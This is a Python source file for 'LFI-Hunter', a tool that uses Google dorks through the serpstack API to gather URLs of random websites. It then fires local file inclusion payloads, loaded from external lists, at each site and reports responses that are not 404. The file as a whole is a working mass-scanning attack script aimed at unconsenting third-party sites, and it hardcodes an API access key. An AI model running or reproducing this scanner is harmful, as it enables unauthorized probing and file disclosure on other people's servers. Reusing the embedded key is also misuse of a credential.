# Modules
from colorama import Fore, Back, Style
import requests
import json
import random
import time

# Keys
api_key="71f08a06f8cd2702caa57d8bbb4ddf0e"
base_url=f"http://api.serpstack.com/search?access_key={api_key}&engine=google&device=desktop&page=1&num=5&output=json&query="

# Banner
banner='''
        -ssssssssssssssssssssssssssssssssssssssssss`        
        -hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh.        
        -hhhhyooooshhhhhhhhsoooooooooooshsoooohhhhh.        
        -hhhhs    /hhhhhhhh+           /h-    yhhhh.        
        -hhhhs    /hhhhhhhh+    .------+h-    yhhhh.        
        -hhhhs    /hhhhhhhh+    ohhhhhhhh-    yhhhh.        
        -hhhhs    /hhhhhhhh+    ohhhhhhhh-    yhhhh.        
        -hhhhs    /hhhhhhhh+    /++++ohhh-    yhhhh.        
        -hhhhs    /hhhhhhhh+         `hhh-    yhhhh.        
        -hhhhs    /hhhhhhhh+    -----:hhh-    yhhhh.        
        -hhhhs    /hhhhhhhh+    ohhhhhhhh-    yhhhh.        
        -hhhhs    /hhhhhhhh+    ohhhhhhhh-    yhhhh.        
        -hhhhs    :sssssssh+    ohhhhhhhh-    yhhhh.        
        -hhhhs           -h+    ohhhhhhhh-    yhhhh.            
        -hhhhyyyyyyyyyyyyyhyyyyyyhhhhhhhhyyyyyhhhhh.        
        -hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh.
'''
print(Fore.RED +banner)
print(Fore.WHITE+"="*60)
print(Fore.WHITE+f"\t[+] Created by","anukulpandey","[+] ")
print("\t[!] TOOL : LFI-Hunter [!]")
print("\tlocal file inclusion vulnerable websites lookup")
print(Fore.WHITE+"="*60)

banner2="""
    __    __________   __  __            __           
   / /   / ____/  _/  / / / /_  ______  / /____  _____
  / /   / /_   / /   / /_/ / / / / __ \/ __/ _ \/ ___/
 / /___/ __/ _/ /   / __  / /_/ / / / / /_/  __/ /    
/_____/_/   /___/  /_/ /_/\__,_/_/ /_/\__/\___/_/     
                                                    v 1.0.0
"""
# Constants
lfi_dorks=[]
lfi_fuzz=[]
lfi_targets=[]
lfi_dorks_random=[]

# Setting up Fuzzer and dorks
with open('LFI-lin.txt','r') as lin:
    lin_fuzz=lin.read()
    for fuzz in lin_fuzz.split():
        lfi_fuzz.append(fuzz)

with open('LFI-win.txt','r') as win:
    win_fuzz=win.read()
    for fuzz in win_fuzz.split():
        lfi_fuzz.append(fuzz)
    print(Fore.GREEN+f'[!] LOADED {Fore.BLUE}{lfi_fuzz.__len__()}{Fore.GREEN} PAYLOADS')

with open('lfi_dork.txt','r') as f:
    data = f.read()
    for dork in data.split():
        lfi_dorks.append(dork)
    print(f'[!] LOADED {lfi_dorks.__len__()} DORKS')
    while lfi_dorks_random.__len__()!=3:
        r=random.randint(0,72)
        if lfi_dorks[r] not in lfi_dorks_random:
            lfi_dorks_random.append(lfi_dorks[r])
            
# Main logic starts here
def google_search(query):
    print(f'[.]Searching dork {query}                                             ',end='\r')
    res=requests.get(base_url+query)
    res_dict=json.loads(res._content.decode('utf-8'))
    with open('targets.txt','a') as f:
        for d in res_dict['organic_results']:
            f.write(f"{d['url']}\n")
            lfi_targets.append(d['url'])

def dork_runner():
    for dork in lfi_dorks_random:
        google_search(dork)
    print(Fore.GREEN+'[!] Found potentially vulnerable targets')
    time.sleep(3)
    print(Fore.YELLOW+banner2)


def lfi_scanner(target):
    print(Fore.WHITE+'[~] Running vulnerability scan against :',target)
    temp_chars=0
    print(Fore.BLUE+'*'*40)
    for fuzz in lfi_fuzz:
        try:
            temp_res=requests.get(f'{target}{fuzz}')
            if(temp_res.status_code!=404):
                if(temp_res._content.__len__()!=temp_chars):
                    temp_chars=temp_res._content.__len__()
                    print(f'[+] Status Code : {temp_res.status_code}   [%] URL: {target}{fuzz}')
        except Exception as e:
            pass 
    print(Fore.BLUE+'*'*40)

def run_scanner():
    dork_runner()
    for target in lfi_targets:
        lfi_scanner(target)

run_scanner()
